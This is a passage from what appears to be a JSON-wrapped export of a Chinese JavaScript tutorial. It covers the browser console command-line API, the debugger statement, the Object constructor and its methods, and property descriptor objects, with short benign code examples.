Data&#039;);\n\nconsole.log(&#039;Request Sent&#039;);\nconsole.error(&#039;Error: Server not responding (500)&#039;);\n\nconsole.groupEnd();</code></pre><p>上面代码只显示一行”Fetching Data“，点击后才会展开，显示其中包含的两行。</p>\n\n        <h3>\n            <a href='#console.trace()，console.clear()' class='header-anchor'>#</a>\n            <span>console.trace()，console.clear()</span>\n        </h3>\n    <p><code>console.trace</code>方法显示当前执行的代码在堆栈中的调用路径。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.trace()\n// console.trace()\n//   (anonymous function)\n//   InjectedScript._evaluateOn\n//   InjectedScript._evaluateAndWrap\n//   InjectedScript.evaluate</code></pre><p><code>console.clear</code>方法用于清除当前控制台的所有输出，将光标回置到第一行。如果用户选中了控制台的“Preserve log”选项，<code>console.clear</code>方法将不起作用。</p>\n\n        <h2>\n            <a href='#控制台命令行-API' class='header-anchor'>#</a>\n            <span>控制台命令行 API</span>\n        </h2>\n    <p>浏览器控制台中，除了使用<code>console</code>对象，还可以使用一些控制台自带的命令行方法。</p>\n<p>（1）<code>$_</code></p>\n<p><code>$_</code>属性返回上一个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 + 2\n// 4\n$_\n// 4</code></pre><p>（2）<code>$0</code> - <code>$4</code></p>\n<p>控制台保存了最近5个在 Elements 面板选中的 DOM 元素，<code>$0</code>代表倒数第一个（最近一个），<code>$1</code>代表倒数第二个，以此类推直到<code>$4</code>。</p>\n<p>（3）<code>$(selector)</code></p>\n<p><code>$(selector)</code>返回第一个匹配的元素，等同于<code>document.querySelector()</code>。注意，如果页面脚本对<code>$</code>有定义，则会覆盖原始的定义。比如，页面里面有 jQuery，控制台执行<code>$(selector)</code>就会采用 jQuery 的实现，返回一个数组。</p>\n<p>（4）<code>$(selector)</code></p>\n<p><code>$(selector)</code>返回选中的 DOM 对象，等同于<code>document.querySelectorAll</code>。</p>\n<p>（5）<code>$x(path)</code></p>\n<p><code>$x(path)</code>方法返回一个数组，包含匹配特定 XPath 表达式的所有 DOM 元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>$x(&quot;//p[a]&quot;)</code></pre><p>上面代码返回所有包含<code>a</code>元素的<code>p</code>元素。</p>\n<p>（6）<code>inspect(object)</code></p>\n<p><code>inspect(object)</code>方法打开相关面板，并选中相应的元素，显示它的细节。DOM 元素在<code>Elements</code>面板中显示，比如<code>inspect(document)</code>会在 Elements 面板显示<code>document</code>元素。JavaScript 对象在控制台面板<code>Profiles</code>面板中显示，比如<code>inspect(window)</code>。</p>\n<p>（7）<code>getEventListeners(object)</code></p>\n<p><code>getEventListeners(object)</code>方法返回一个对象，该对象的成员为<code>object</code>登记了回调函数的各种事件（比如<code>click</code>或<code>keydown</code>），每个事件对应一个数组，数组的成员为该事件的回调函数。</p>\n<p>（8）<code>keys(object)</code>，<code>values(object)</code></p>\n<p><code>keys(object)</code>方法返回一个数组，包含<code>object</code>的所有键名。</p>\n<p><code>values(object)</code>方法返回一个数组，包含<code>object</code>的所有键值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o = {&#039;p1&#039;: &#039;a&#039;, &#039;p2&#039;: &#039;b&#039;};\n\nkeys(o)\n// [&quot;p1&quot;, &quot;p2&quot;]\nvalues(o)\n// [&quot;a&quot;, &quot;b&quot;]</code></pre><p>（9）<code>monitorEvents(object[, events]) ，unmonitorEvents(object[, events])</code></p>\n<p><code>monitorEvents(object[, events])</code>方法监听特定对象上发生的特定事件。事件发生时，会返回一个<code>Event</code>对象，包含该事件的相关信息。<code>unmonitorEvents</code>方法用于停止监听。</p>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents(window, &quot;resize&quot;);\nmonitorEvents(window, [&quot;resize&quot;, &quot;scroll&quot;])</code></pre><p>上面代码分别表示单个事件和多个事件的监听方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents($0, &#039;mouse&#039;);\nunmonitorEvents($0, &#039;mousemove&#039;);</code></pre><p>上面代码表示如何停止监听。</p>\n<p><code>monitorEvents</code>允许监听同一大类的事件。所有事件可以分成四个大类。</p>\n<ul>\n<li>mouse：&quot;mousedown&quot;, &quot;mouseup&quot;, &quot;click&quot;, &quot;dblclick&quot;, &quot;mousemove&quot;, &quot;mouseover&quot;, &quot;mouseout&quot;, &quot;mousewheel&quot;</li>\n<li>key：&quot;keydown&quot;, &quot;keyup&quot;, &quot;keypress&quot;, &quot;textInput&quot;</li>\n<li>touch：&quot;touchstart&quot;, &quot;touchmove&quot;, &quot;touchend&quot;, &quot;touchcancel&quot;</li>\n<li>control：&quot;resize&quot;, &quot;scroll&quot;, &quot;zoom&quot;, &quot;focus&quot;, &quot;blur&quot;, &quot;select&quot;, &quot;change&quot;, &quot;submit&quot;, &quot;reset&quot;</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>monitorEvents($(&quot;#msg&quot;), &quot;key&quot;);</code></pre><p>上面代码表示监听所有<code>key</code>大类的事件。</p>\n<p>（10）其他方法</p>\n<p>命令行 API 还提供以下方法。</p>\n<ul>\n<li><code>clear()</code>：清除控制台的历史。</li>\n<li><code>copy(object)</code>：复制特定 DOM 元素到剪贴板。</li>\n<li><code>dir(object)</code>：显示特定对象的所有属性，是<code>console.dir</code>方法的别名。</li>\n<li><code>dirxml(object)</code>：显示特定对象的 XML 形式，是<code>console.dirxml</code>方法的别名。</li>\n</ul>\n\n        <h2>\n            <a href='#debugger-语句' class='header-anchor'>#</a>\n            <span>debugger 语句</span>\n        </h2>\n    <p><code>debugger</code>语句主要用于除错，作用是设置断点。如果有正在运行的除错工具，程序运行到<code>debugger</code>语句时会自动停下。如果没有除错工具，<code>debugger</code>语句不会产生任何结果，JavaScript 引擎自动跳过这一句。</p>\n<p>Chrome 浏览器中，当代码运行到<code>debugger</code>语句时，就会暂停运行，自动打开脚本源码界面。</p>\n<pre class=\"prettyprint language-javascript\"><code>for(var i = 0; i &lt; 5; i++){\n  console.log(i);\n  if (i === 2) debugger;\n}</code></pre><p>上面代码打印出0，1，2以后，就会暂停，自动打开源码界面，等待进一步处理。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Chrome Developer Tools, <a href=\"https://developers.google.com/chrome-developer-tools/docs/console\">Using the Console</a></li>\n<li>Matt West, <a href=\"http://blog.teamtreehouse.com/mastering-developer-tools-console\">Mastering The Developer Tools Console</a></li>\n<li>Firebug Wiki, <a href=\"https://getfirebug.com/wiki/index.php/Console_API\">Console API</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/10/console-api.html\">The JavaScript console API</a></li>\n<li>Marius Schulz, <a href=\"http://blog.mariusschulz.com/2013/11/13/advanced-javascript-debugging-with-consoletable\">Advanced JavaScript Debugging with console.table()</a></li>\n<li>Google Developer, <a href=\"https://developers.google.com/chrome-developer-tools/docs/commandline-api\">Command Line API Reference</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Object对象","link":"/stdlib/object.html"}],"content":"\n        <h1>\n            <a href='#Object-对象' class='header-anchor'>#</a>\n            <span>Object 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 原生提供<code>Object</code>对象（注意起首的<code>O</code>是大写），本章介绍该对象原生的各种方法。</p>\n<p>JavaScript 的所有其他对象都继承自<code>Object</code>对象，即那些对象都是<code>Object</code>的实例。</p>\n<p><code>Object</code>对象的原生方法分成两类：<code>Object</code>本身的方法与<code>Object</code>的实例方法。</p>\n<p><strong>（1）<code>Object</code>对象本身的方法</strong></p>\n<p>所谓”本身的方法“就是直接定义在<code>Object</code>对象的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.print = function (o) { console.log(o) };</code></pre><p>上面代码中，<code>print</code>方法就是直接定义在<code>Object</code>对象上。</p>\n<p><strong>（2）<code>Object</code>的实例方法</strong></p>\n<p>所谓实例方法就是定义在<code>Object</code>原型对象<code>Object.prototype</code>上的方法。它可以被<code>Object</code>实例直接使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.print = function () {\n  console.log(this);\n};\n\nvar obj = new Object();\nobj.print() // Object</code></pre><p>上面代码中，<code>Object.prototype</code>定义了一个<code>print</code>方法，然后生成一个<code>Object</code>的实例<code>obj</code>。<code>obj</code>直接继承了<code>Object.prototype</code>的属性和方法，可以直接使用<code>obj.print</code>调用<code>print</code>方法。也就是说，<code>obj</code>对象的<code>print</code>方法实质上就是调用<code>Object.prototype.print</code>方法。</p>\n<p>关于原型对象<code>object.prototype</code>的详细解释，参见《面向对象编程》章节。这里只要知道，凡是定义在<code>Object.prototype</code>对象上面的属性和方法，将被所有实例对象共享就可以了。</p>\n<p>以下先介绍<code>Object</code>作为函数的用法，然后再介绍<code>Object</code>对象的原生方法，分成对象自身的方法（又称为”静态方法“）和实例方法两部分。</p>\n\n        <h2>\n            <a href='#Object()' class='header-anchor'>#</a>\n            <span>Object()</span>\n        </h2>\n    <p><code>Object</code>本身是一个函数，可以当作工具方法使用，将任意值转为对象。这个方法常用于保证某个值一定是对象。</p>\n<p>如果参数为空（或者为<code>undefined</code>和<code>null</code>），<code>Object()</code>返回一个空对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object();\n// 等同于\nvar obj = Object(undefined);\nvar obj = Object(null);\n\nobj instanceof Object // true</code></pre><p>上面代码的含义，是将<code>undefined</code>和<code>null</code>转为对象，结果得到了一个空对象<code>obj</code>。</p>\n<p><code>instanceof</code>运算符用来验证，一个对象是否为指定的构造函数的实例。<code>obj instanceof Object</code>返回<code>true</code>，就表示<code>obj</code>对象是<code>Object</code>的实例。</p>\n<p>如果参数是原始类型的值，<code>Object</code>方法将其转为对应的包装对象的实例（参见《原始类型的包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object(1);\nobj instanceof Object // true\nobj instanceof Number // true\n\nvar obj = Object(&#039;foo&#039;);\nobj instanceof Object // true\nobj instanceof String // true\n\nvar obj = Object(true);\nobj instanceof Object // true\nobj instanceof Boolean // true</code></pre><p>上面代码中，<code>Object</code>函数的参数是各种原始类型的值，转换成对象就是原始类型值对应的包装对象。</p>\n<p>如果<code>Object</code>方法的参数是一个对象，它总是返回该对象，即不用转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\nvar obj = Object(arr); // 返回原数组\nobj === arr // true\n\nvar value = {};\nvar obj = Object(value) // 返回原对象\nobj === value // true\n\nvar fn = function () {};\nvar obj = Object(fn); // 返回原函数\nobj === fn // true</code></pre><p>利用这一点，可以写一个判断变量是否为对象的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function isObject(value) {\n  return value === Object(value);\n}\n\nisObject([]) // true\nisObject(true) // false</code></pre>\n        <h2>\n            <a href='#Object-构造函数' class='header-anchor'>#</a>\n            <span>Object 构造函数</span>\n        </h2>\n    <p><code>Object</code>不仅可以当作工具函数使用，还可以当作构造函数使用，即前面可以使用<code>new</code>命令。</p>\n<p><code>Object</code>构造函数的首要用途，是直接通过它来生成新对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();</code></pre><blockquote>\n<p>注意，通过<code>var obj = new Object()</code>的写法生成新对象，与字面量的写法<code>var obj = {}</code>是等价的。或者说，后者只是前者的一种简便写法。</p>\n</blockquote>\n<p><code>Object</code>构造函数的用法与工具方法很相似，几乎一模一样。使用时，可以接受一个参数，如果该参数是一个对象，则直接返回这个对象；如果是一个原始类型的值，则返回该值对应的包装对象（详见《包装对象》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {a: 1};\nvar o2 = new Object(o1);\no1 === o2 // true\n\nvar obj = new Object(123);\nobj instanceof Number // true</code></pre><p>虽然用法相似，但是<code>Object(value)</code>与<code>new Object(value)</code>两者的语义是不同的，<code>Object(value)</code>表示将<code>value</code>转成一个对象，<code>new Object(value)</code>则表示新生成一个对象，它的值是<code>value</code>。</p>\n\n        <h2>\n            <a href='#Object-的静态方法' class='header-anchor'>#</a>\n            <span>Object 的静态方法</span>\n        </h2>\n    <p>所谓“静态方法”，是指部署在<code>Object</code>对象自身的方法。</p>\n\n        <h3>\n            <a href='#Object.keys()，Object.getOwnPropertyNames()' class='header-anchor'>#</a>\n            <span>Object.keys()，Object.getOwnPropertyNames()</span>\n        </h3>\n    <p><code>Object.keys</code>方法和<code>Object.getOwnPropertyNames</code>方法都用来遍历对象的属性。</p>\n<p><code>Object.keys</code>方法的参数是一个对象，返回一个数组。该数组的成员都是该对象自身的（而不是继承的）所有属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.keys(obj) // [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p><code>Object.getOwnPropertyNames</code>方法与<code>Object.keys</code>类似，也是接受一个对象作为参数，返回一个数组，包含了该对象自身的所有属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.getOwnPropertyNames(obj) // [&quot;p1&quot;, &quot;p2&quot;]</code></pre><p>对于一般的对象来说，<code>Object.keys()</code>和<code>Object.getOwnPropertyNames()</code>返回的结果是一样的。只有涉及不可枚举属性时，才会有不一样的结果。<code>Object.keys</code>方法只返回可枚举的属性（详见《对象属性的描述对象》一章），<code>Object.getOwnPropertyNames</code>方法还返回不可枚举的属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;Hello&#039;, &#039;World&#039;];\n\nObject.keys(a) // [&quot;0&quot;, &quot;1&quot;]\nObject.getOwnPropertyNames(a) // [&quot;0&quot;, &quot;1&quot;, &quot;length&quot;]</code></pre><p>上面代码中，数组的<code>length</code>属性是不可枚举的属性，所以只出现在<code>Object.getOwnPropertyNames</code>方法的返回结果中。</p>\n<p>由于 JavaScript 没有提供计算对象属性个数的方法，所以可以用这两个方法代替。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p1: 123,\n  p2: 456\n};\n\nObject.keys(obj).length // 2\nObject.getOwnPropertyNames(obj).length // 2</code></pre><p>一般情况下，几乎总是使用<code>Object.keys</code>方法，遍历数组的属性。</p>\n\n        <h3>\n            <a href='#其他方法' class='header-anchor'>#</a>\n            <span>其他方法</span>\n        </h3>\n    <p>除了上面提到的两个方法，<code>Object</code>还有不少其他静态方法，将在后文逐一详细介绍。</p>\n<p><strong>（1）对象属性模型的相关方法</strong></p>\n<ul>\n<li><code>Object.getOwnPropertyDescriptor()</code>：获取某个属性的描述对象。</li>\n<li><code>Object.defineProperty()</code>：通过描述对象，定义某个属性。</li>\n<li><code>Object.defineProperties()</code>：通过描述对象，定义多个属性。</li>\n</ul>\n<p><strong>（2）控制对象状态的方法</strong></p>\n<ul>\n<li><code>Object.preventExtensions()</code>：防止对象扩展。</li>\n<li><code>Object.isExtensible()</code>：判断对象是否可扩展。</li>\n<li><code>Object.seal()</code>：禁止对象配置。</li>\n<li><code>Object.isSealed()</code>：判断一个对象是否可配置。</li>\n<li><code>Object.freeze()</code>：冻结一个对象。</li>\n<li><code>Object.isFrozen()</code>：判断一个对象是否被冻结。</li>\n</ul>\n<p><strong>（3）原型链相关方法</strong></p>\n<ul>\n<li><code>Object.create()</code>：该方法可以指定原型对象和属性，返回一个新的对象。</li>\n<li><code>Object.getPrototypeOf()</code>：获取对象的<code>Prototype</code>对象。</li>\n</ul>\n\n        <h2>\n            <a href='#Object-的实例方法' class='header-anchor'>#</a>\n            <span>Object 的实例方法</span>\n        </h2>\n    <p>除了静态方法，还有不少方法定义在<code>Object.prototype</code>对象。它们称为实例方法，所有<code>Object</code>的实例对象都继承了这些方法。</p>\n<p><code>Object</code>实例对象的方法，主要有以下六个。</p>\n<ul>\n<li><code>Object.prototype.valueOf()</code>：返回当前对象对应的值。</li>\n<li><code>Object.prototype.toString()</code>：返回当前对象对应的字符串形式。</li>\n<li><code>Object.prototype.toLocaleString()</code>：返回当前对象对应的本地字符串形式。</li>\n<li><code>Object.prototype.hasOwnProperty()</code>：判断某个属性是否为当前对象自身的属性，还是继承自原型对象的属性。</li>\n<li><code>Object.prototype.isPrototypeOf()</code>：判断当前对象是否为另一个对象的原型。</li>\n<li><code>Object.prototype.propertyIsEnumerable()</code>：判断某个属性是否可枚举。</li>\n</ul>\n<p>本节介绍前四个方法，另外两个方法将在后文相关章节介绍。</p>\n\n        <h3>\n            <a href='#Object.prototype.valueOf()' class='header-anchor'>#</a>\n            <span>Object.prototype.valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法的作用是返回一个对象的“值”，默认情况下返回对象本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nobj.valueOf() === obj // true</code></pre><p>上面代码比较<code>obj.valueOf()</code>与<code>obj</code>本身，两者是一样的。</p>\n<p><code>valueOf</code>方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法（详见《数据类型转换》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n1 + obj // &quot;1[object Object]&quot;</code></pre><p>上面代码将对象<code>obj</code>与数字<code>1</code>相加，这时 JavaScript 就会默认调用<code>valueOf()</code>方法，求出<code>obj</code>的值再与<code>1</code>相加。所以，如果自定义<code>valueOf</code>方法，就可以得到想要的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nobj.valueOf = function () {\n  return 2;\n};\n\n1 + obj // 3</code></pre><p>上面代码自定义了<code>obj</code>对象的<code>valueOf</code>方法，于是<code>1 + obj</code>就得到了<code>3</code>。这种方法就相当于用自定义的<code>obj.valueOf</code>，覆盖<code>Object.prototype.valueOf</code>。</p>\n\n        <h3>\n            <a href='#Object.prototype.toString()' class='header-anchor'>#</a>\n            <span>Object.prototype.toString()</span>\n        </h3>\n    <p><code>toString</code>方法的作用是返回一个对象的字符串形式，默认情况下返回类型字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = new Object();\no1.toString() // &quot;[object Object]&quot;\n\nvar o2 = {a:1};\no2.toString() // &quot;[object Object]&quot;</code></pre><p>上面代码表示，对于一个对象调用<code>toString</code>方法，会返回字符串<code>[object Object]</code>，该字符串说明对象的类型。</p>\n<p>字符串<code>[object Object]</code>本身没有太大的用处，但是通过自定义<code>toString</code>方法，可以让对象在自动类型转换时，得到想要的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n\nobj.toString = function () {\n  return &#039;hello&#039;;\n};\n\nobj + &#039; &#039; + &#039;world&#039; // &quot;hello world&quot;</code></pre><p>上面代码表示，当对象用于字符串加法时，会自动调用<code>toString</code>方法。由于自定义了<code>toString</code>方法，所以返回字符串<code>hello world</code>。</p>\n<p>数组、字符串、函数、Date 对象都分别部署了自定义的<code>toString</code>方法，覆盖了<code>Object.prototype.toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].toString() // &quot;1,2,3&quot;\n\n&#039;123&#039;.toString() // &quot;123&quot;\n\n(function () {\n  return 123;\n}).toString()\n// &quot;function () {\n//   return 123;\n// }&quot;\n\n(new Date()).toString()\n// &quot;Tue May 10 2016 09:11:31 GMT+0800 (CST)&quot;</code></pre><p>上面代码中，数组、字符串、函数、Date 对象调用<code>toString</code>方法，并不会返回<code>[object Object]</code>，因为它们都自定义了<code>toString</code>方法，覆盖原始方法。</p>\n\n        <h3>\n            <a href='#toString()-的应用：判断数据类型' class='header-anchor'>#</a>\n            <span>toString() 的应用：判断数据类型</span>\n        </h3>\n    <p><code>Object.prototype.toString</code>方法返回对象的类型字符串，因此可以用来判断一个值的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.toString() // &quot;[object Object]&quot;</code></pre><p>上面代码调用空对象的<code>toString</code>方法，结果返回一个字符串<code>object Object</code>，其中第二个<code>Object</code>表示该值的构造函数。这是一个十分有用的判断数据类型的方法。</p>\n<p>由于实例对象可能会自定义<code>toString</code>方法，覆盖掉<code>Object.prototype.toString</code>方法，所以为了得到类型字符串，最好直接使用<code>Object.prototype.toString</code>方法。通过函数的<code>call</code>方法，可以在任意值上调用这个方法，帮助我们判断这个值的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.toString.call(value)</code></pre><p>上面代码表示对<code>value</code>这个值调用<code>Object.prototype.toString</code>方法。</p>\n<p>不同数据类型的<code>Object.prototype.toString</code>方法返回值如下。</p>\n<ul>\n<li>数值：返回<code>[object Number]</code>。</li>\n<li>字符串：返回<code>[object String]</code>。</li>\n<li>布尔值：返回<code>[object Boolean]</code>。</li>\n<li>undefined：返回<code>[object Undefined]</code>。</li>\n<li>null：返回<code>[object Null]</code>。</li>\n<li>数组：返回<code>[object Array]</code>。</li>\n<li>arguments 对象：返回<code>[object Arguments]</code>。</li>\n<li>函数：返回<code>[object Function]</code>。</li>\n<li>Error 对象：返回<code>[object Error]</code>。</li>\n<li>Date 对象：返回<code>[object Date]</code>。</li>\n<li>RegExp 对象：返回<code>[object RegExp]</code>。</li>\n<li>其他对象：返回<code>[object Object]</code>。</li>\n</ul>\n<p>这就是说，<code>Object.prototype.toString</code>可以看出一个值到底是什么类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.prototype.toString.call(2) // &quot;[object Number]&quot;\nObject.prototype.toString.call(&#039;&#039;) // &quot;[object String]&quot;\nObject.prototype.toString.call(true) // &quot;[object Boolean]&quot;\nObject.prototype.toString.call(undefined) // &quot;[object Undefined]&quot;\nObject.prototype.toString.call(null) // &quot;[object Null]&quot;\nObject.prototype.toString.call(Math) // &quot;[object Math]&quot;\nObject.prototype.toString.call({}) // &quot;[object Object]&quot;\nObject.prototype.toString.call([]) // &quot;[object Array]&quot;</code></pre><p>利用这个特性，可以写出一个比<code>typeof</code>运算符更准确的类型判断函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var type = function (o){\n  var s = Object.prototype.toString.call(o);\n  return s.match(/\\[object (.*?)\\]/)[1].toLowerCase();\n};\n\ntype({}); // &quot;object&quot;\ntype([]); // &quot;array&quot;\ntype(5); // &quot;number&quot;\ntype(null); // &quot;null&quot;\ntype(); // &quot;undefined&quot;\ntype(/abcd/); // &quot;regex&quot;\ntype(new Date()); // &quot;date&quot;</code></pre><p>在上面这个<code>type</code>函数的基础上，还可以加上专门判断某种类型数据的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var type = function (o){\n  var s = Object.prototype.toString.call(o);\n  return s.match(/\\[object (.*?)\\]/)[1].toLowerCase();\n};\n\n[&#039;Null&#039;,\n &#039;Undefined&#039;,\n &#039;Object&#039;,\n &#039;Array&#039;,\n &#039;String&#039;,\n &#039;Number&#039;,\n &#039;Boolean&#039;,\n &#039;Function&#039;,\n &#039;RegExp&#039;\n].forEach(function (t) {\n  type[&#039;is&#039; + t] = function (o) {\n    return type(o) === t.toLowerCase();\n  };\n});\n\ntype.isObject({}) // true\ntype.isNumber(NaN) // true\ntype.isRegExp(/abc/) // true</code></pre>\n        <h3>\n            <a href='#Object.prototype.toLocaleString()' class='header-anchor'>#</a>\n            <span>Object.prototype.toLocaleString()</span>\n        </h3>\n    <p><code>Object.prototype.toLocaleString</code>方法与<code>toString</code>的返回结果相同，也是返回一个值的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.toString(obj) // &quot;[object Object]&quot;\nobj.toLocaleString(obj) // &quot;[object Object]&quot;</code></pre><p>这个方法的主要作用是留出一个接口，让各种不同的对象实现自己版本的<code>toLocaleString</code>，用来返回针对某些地域的特定的值。目前，主要有三个对象自定义了<code>toLocaleString</code>方法。</p>\n<ul>\n<li>Array.prototype.toLocaleString()</li>\n<li>Number.prototype.toLocaleString()</li>\n<li>Date.prototype.toLocaleString()</li>\n</ul>\n<p>举例来说，日期的实例对象的<code>toString</code>和<code>toLocaleString</code>返回值就不一样，而且<code>toLocaleString</code>的返回值跟用户设定的所在地域相关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var date = new Date();\ndate.toString() // &quot;Tue Jan 01 2018 12:01:33 GMT+0800 (CST)&quot;\ndate.toLocaleString() // &quot;1/01/2018, 12:01:33 PM&quot;</code></pre>\n        <h3>\n            <a href='#Object.prototype.hasOwnProperty()' class='header-anchor'>#</a>\n            <span>Object.prototype.hasOwnProperty()</span>\n        </h3>\n    <p><code>Object.prototype.hasOwnProperty</code>方法接受一个字符串作为参数，返回一个布尔值，表示该实例对象自身是否具有该属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: 123\n};\n\nobj.hasOwnProperty(&#039;p&#039;) // true\nobj.hasOwnProperty(&#039;toString&#039;) // false</code></pre><p>上面代码中，对象<code>obj</code>自身具有<code>p</code>属性，所以返回<code>true</code>。<code>toString</code>属性是继承的，所以返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/08/protecting-objects.html\">Protecting objects in JavaScript</a></li>\n<li>kangax, <a href=\"http://perfectionkills.com/understanding-delete/\">Understanding delete</a></li>\n<li>Jon Bretman, <a href=\"http://techblog.badoo.com/blog/2013/11/01/type-checking-in-javascript/\">Type Checking in JavaScript</a></li>\n<li>Cody Lindley, <a href=\"http://tech.pro/tutorial/1671/thinking-about-ecmascript-5-parts\">Thinking About ECMAScript 5 Parts</a></li>\n<li>Bjorn Tipling, <a href=\"http://bjorn.tipling.com/advanced-objects-in-javascript\">Advanced objects in JavaScript</a></li>\n<li>Javier Márquez, <a href=\"http://arqex.com/967/javascript-properties-enumerable-writable-configurable\">Javascript properties are enumerable, writable and configurable</a></li>\n<li>Sella Rafaeli, <a href=\"http://www.sellarafaeli.com/blog/native_javascript_data_binding\">Native JavaScript Data-Binding</a>: 使用存取函数实现model与view的双向绑定</li>\n<li>Lea Verou, <a href=\"http://lea.verou.me/2015/08/copying-properties-the-robust-way/\">Copying object properties, the robust way</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"属性描述对象","link":"/stdlib/attributes.html"}],"content":"\n        <h1>\n            <a href='#属性描述对象' class='header-anchor'>#</a>\n            <span>属性描述对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 提供了一个内部数据结构，用来描述对象的属性，控制它的行为，比如该属性是否可写、可遍历等等。这个内部数据结构称为“属性描述对象”（attributes object）。每个属性都有自己对应的属性描述对象，保存该属性的一些元信息。</p>\n<p>下面是属性描述对象的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  value: 123,\n  writable: false,\n  enumerable: true,\n  configurable: false,\n  get: undefined,\n  set: undefined\n}</code></pre><p>属性描述对象提供6个元属性。</p>\n<p>（1）<code>value</code></p>\n<p><code>value</code>是该属性的属性值，默认为<code>undefined</code>。</p>\n<p>（2）<code>writable</code></p>\n<p><code>writable</code>是一个布尔值，表示属性值（value）是否可改变（即是否可写），默认为<code>true</code>。</p>\n<p>（3）<code>enumerable</code></p>\n<p><code>enumerable</code>是一个布尔值，表示该属性是否可遍历，默认为<code>true</code>。如果设为<code>false</code>，会使得某些操作（比如<code>for...in</code>循环、<code>Object.keys()</code>）跳过该属性。</p>\n<p>（4）<code>configurable</code></p>\n<p><code>configurable</code>是一个布尔值，表示可配置性，默认为<code>true</code>。如果设为<code>false</code>，将阻止某些操作改写该属性，比如无法删除该属性，也不得改变该属性的属性描述对象（<code>value</code>属性除外）。也就是说，<code>configurable</code>属性控制了属性描述对象的可写性。</p>\n<p>（5）<code>get</code></p>\n<p><code>get</code>是一个函数，表示该属性的取值函数（getter），默认为<code>undefined</code>。</p>\n<p>（6）<code>set</code></p>\n<p><code>set</code>是一个函数，表示该属性的存值函数（setter），默认为<code>undefined</code>。</p>\n\n        <h2>\n            <a href='#Object.getOwnPropertyDescriptor()' class='header-anchor'>#</a>\n            <span>Object.getOwnPropertyDescriptor()</span>\n        </h2>\n    <p><code>Object.getOwnPropertyDescriptor</code>方法可以获取属性描述对象。它的第一个参数是一个对象，第二个参数是一个字符串，对应该对象的某个属性名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object { value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: true\n// }</code></pre><p>上面代码中，<code>Object.getOwnPropertyDescriptor</code>方法获取<code>obj.p</code>的属性描述对象。</p>\n<p>注意，<code>Object.getOwnPropertyDescriptor</code>方法只能用于对象自身的属性，不能用于继承的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.getOwnPropertyDescriptor(obj, &#039;toString&#039;)\n// undefined</code></pre><p>上面代码中，<code>toString</code>是<code>Obj</code>对象继承的属性，<code>Object.getOwnPropertyDescriptor</code>无法获取。</p>\n\n        <h2>\n            <a href='#Object.getOwnPropertyNames()' class='header-anchor'>#</a>\n            <span>Object.getOwnPropertyNames()</span>\n        </h2>\n    <p><code>Object.getOwnPropertyNames</code>方法返回一个数组，成员是参数对象自身的全部属性的属性名，不管该属性是否可遍历。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperties({}, {\n  p1: { value: 1, enumerable: true },\n  p2: { value: 2, enumerable: false }\n});\n\nObject.getOwnPropertyNames(obj)\n// [&quot;p1&quot;, 